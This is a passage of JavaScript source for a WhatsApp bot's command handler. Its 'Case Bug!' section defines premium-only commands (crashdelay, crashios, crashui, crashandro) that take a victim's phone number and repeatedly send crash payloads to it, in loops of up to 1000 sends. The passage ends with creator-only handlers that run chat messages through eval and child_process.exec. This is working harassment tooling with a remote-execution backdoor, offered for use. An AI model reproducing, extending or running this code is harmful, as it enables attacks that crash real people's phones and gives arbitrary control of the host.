                } else if (caption) {
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else {
                    await ReplyRil(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;
//=======================\\

//===========Case Bug!============\\
case 'crashdelay': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    let jid = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 1000; r++) {
    await exoticsStunt(Ril, jid)
    await sleep(5000)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'crashios': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    let jid = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 100; r++) {
    await exoticsIPV2(Ril, jid)
    await sleep(2500)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'crashui': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    let jid = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 100; r++) {
    await exoticsChronos(Ril, jid, etc = true)
    await sleep(1000)
    await exoticsVideoX(Ril, jid)
    await sleep(1000)
    await exoticsUiX(Ril, jid)
    await sleep(1000)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'crashandro': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    let jid = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 1; r++) {
    await exoticsOrderx(Ril, jid)
    await sleep(100)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=======================\\
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRil(bang)}
try {
ReplyRil(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRil(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRil(evaled)
} catch (err) {
await ReplyRil(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyRil(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
Ril.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\